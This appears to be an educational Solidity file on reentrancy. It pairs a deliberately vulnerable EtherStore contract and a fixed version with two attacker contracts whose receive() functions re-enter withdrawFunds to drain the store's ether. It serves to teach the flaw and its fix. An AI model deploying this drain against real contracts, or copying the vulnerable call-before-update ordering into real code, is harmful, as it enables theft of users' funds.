// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.0;

contract EtherStore {
    uint256 public withdrawalLimit = 1 ether;
    mapping(address => uint256) public lastWithdrawTime;
    mapping(address => uint256) public balances;
    
    function depositFunds() public payable {
        balances[msg.sender] += msg.value;
    }
    
    /// @dev This function is vulnerable to reentry. The external
    /// call occurs before all the state changes have been made.
    function withdrawFunds(uint256 _weiToWithdraw) public {
        require(balances[msg.sender] >= _weiToWithdraw, "Insufficient Balance");
        require(_weiToWithdraw <= withdrawalLimit, "Over Withdrawal Limit");
        require(block.timestamp >= lastWithdrawTime[msg.sender] + 1 weeks, "Withdraw too soon after last");
        (bool success, bytes memory returnData) = msg.sender.call{ value: _weiToWithdraw }("");
        require(success, "Call Failed");
        balances[msg.sender] -= _weiToWithdraw;
        lastWithdrawTime[msg.sender] = block.timestamp;
    }
}

contract EtherStoreFixed {
    uint256 public withdrawalLimit = 1 ether;
    mapping(address => uint256) public lastWithdrawTime;
    mapping(address => uint256) public balances;
    
    function depositFunds() public payable {
        balances[msg.sender] += msg.value;
    }
    
    /// @dev This function is not vulnerable to reentry. The external
    /// call occurs after all the balance state change has been made.
    function withdrawFunds(uint256 _weiToWithdraw) public {
        require(balances[msg.sender] >= _weiToWithdraw, "Insufficient Balance");
        require(_weiToWithdraw <= withdrawalLimit, "Over Withdrawal Limit");
        require(block.timestamp >= lastWithdrawTime[msg.sender] + 1 weeks, "Withdraw too soon after last");
        balances[msg.sender] -= _weiToWithdraw;
        (bool success, bytes memory returnData) = msg.sender.call{ value: _weiToWithdraw }("");
        require(success, "Call Failed");
        lastWithdrawTime[msg.sender] = block.timestamp;
    }
}

contract EtherStoreAttacker {
    EtherStore public etherStore;
    
    constructor(address etherStoreAddress) {
        etherStore = EtherStore(etherStoreAddress);
    }
    
    /// @dev The function which initiates the attack. 1 ether must
    /// be provided with the call.
    function attackEtherStore() public payable {
        require(msg.value >= 1 ether, "Insufficient ether provided");
        etherStore.depositFunds{ value: 1 ether }();
        etherStore.withdrawFunds(1 ether);
    }
    
    function collectEther() public {
        msg.sender.transfer(address(this).balance);
    }
    
    /// @dev The receive function is triggered upon receipt of the
    /// funds from the EtherStore. withdrawFunds() is then called
    /// again to repeat the drain.
    receive () external payable {
        if(address(etherStore).balance >= 1 ether){
            etherStore.withdrawFunds(1 ether);
        }
    }
}

contract EtherStoreFixedAttacker {
    EtherStoreFixed public etherStore;
    
    constructor(address etherStoreAddress) {
        etherStore = EtherStoreFixed(etherStoreAddress);
    }
 
    /// @dev The function which initiates the attack. 1 ether must
    /// be provided with the call.
    function attackEtherStore() public payable {
        require(msg.value >= 1 ether, "Insufficient ether provided");
        etherStore.depositFunds{ value: 1 ether }();
        etherStore.withdrawFunds(1 ether);
    }
    
    function collectEther() public {
        msg.sender.transfer(address(this).balance);
    }
    
    /// @dev The receive function is triggered upon receipt of the
    /// funds from the EtherStore. withdrawFunds() is then called
    /// again to repeat the drain.
    receive () external payable {
        if(address(etherStore).balance >= 1 ether){
            etherStore.withdrawFunds(1 ether);
        }
    }
}